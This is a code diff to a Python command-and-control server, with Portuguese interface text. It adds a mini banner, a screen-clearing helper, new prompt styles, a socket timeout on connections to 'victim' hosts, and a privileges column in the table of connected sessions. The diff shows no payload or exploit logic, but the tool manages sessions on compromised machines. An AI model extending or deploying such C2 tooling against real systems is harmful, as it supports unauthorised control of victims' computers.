@@ -2,16 +2,18 @@ import socket
 import threading
 import time
 import select
+import os
 from datetime import datetime
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.prompt import Prompt
 from rich.progress import Progress
+from rich.box import ROUNDED
 
 from core.encryption import EncryptionHandler
 from core.client_handler import ClientHandler
-from utils.helpers import display_banner
+from utils.helpers import display_banner, display_mini_banner
 from utils.logger import CommandLogger
 
 class C2Server:
@@ -29,9 +31,19 @@ class C2Server:
         self.mode = "server"
         self.console = Console()
         self.logger = CommandLogger()
+        self.prompt_style = "bold red"
+        self.client_prompt_style = "bold cyan"
         
     def display_banner(self):
         display_banner(self.console, self.host, self.port)
+        
+    def display_mini_banner(self):
+        display_mini_banner(self.console)
+        
+    def clear_screen(self):
+        """Limpa a tela de forma compatível com diferentes sistemas"""
+        os.system('cls' if os.name == 'nt' else 'clear')
+        self.display_mini_banner()
         
     def start_server(self):
         try:
@@ -68,6 +80,7 @@ class C2Server:
             self.console.print(f"[yellow]Tentando conectar a {target_host}:{target_port}...[/yellow]")
             
             victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            victim_socket.settimeout(10)
             victim_socket.connect((target_host, target_port))
             
             # Gerar ID de sessão
@@ -86,7 +99,8 @@ class C2Server:
                 'active': True,
                 'os': 'Desconhecido',
                 'username': 'Desconhecido',
-                'is_victim': True
+                'is_victim': True,
+                'privileges': 'Desconhecido'
             }
             
             self.sessions[session_id] = victim_socket
@@ -133,7 +147,8 @@ class C2Server:
                     'active': True,
                     'os': 'Desconhecido',
                     'username': 'Desconhecido',
-                    'is_victim': False
+                    'is_victim': False,
+                    'privileges': 'Desconhecido'
                 }
                 
                 self.sessions[session_id] = client_socket
@@ -236,11 +251,12 @@ class C2Server:
             self.console.print("[yellow]Nenhum cliente conectado[/yellow]")
             return
             
-        table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta")
+        table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta", box=ROUNDED)
         table.add_column("Sessão", style="cyan", no_wrap=True)
         table.add_column("Endereço", style="green")
         table.add_column("Usuário", style="yellow")
         table.add_column("Sistema")
+        table.add_column("Privilégios")
         table.add_column("Conectado em", no_wrap=True)
         table.add_column("Última atividade", no_wrap=True)
         table.add_column("Tipo")
@@ -259,6 +275,7 @@ class C2Server:
                 f"{client['address'][0]}:{client['address'][1]}",
                 client['username'],
                 client['os'],
+                client['privileges'],
                 client['connected_at'],
                 last_active_str,
                 client_type
@@ -330,22 +347,26 @@ class C2Server:
         self.console.print("[green]Chave de criptografia definida[/green]")
         return True
     
+    def get_prompt(self):
+        """Retorna o prompt personalizado baseado no modo"""
+        if self.mode == "server":
+            return f"[{self.prompt_style}]c2[/{self.prompt_style}] > "
+        else:
+            return f"[{self.client_prompt_style}]c2-client[/{self.client_prompt_style}] > "
+    
     def run(self):
-        self.display_banner()
+        if not self.running:
+            if not self.start_server():
+                return
         
-        if not self.start_server():
-            return
-            
+        self.clear_screen()
         self.console.print("[green]Digite 'help' para ver os comandos disponíveis[/green]")
         
         # Loop principal de comando
         while True:
             try:
                 # Prompt personalizado baseado no modo
-                if self.mode == "server":
-                    prompt_text = "[bold red]c2[/bold red] > "
-                else:
-                    prompt_text = "[bold red]c2[/bold red][bold blue] (client mode)[/bold blue] > "
+                prompt_text = self.get_prompt()
                 
                 command_input = Prompt.ask(prompt_text).strip()
                 
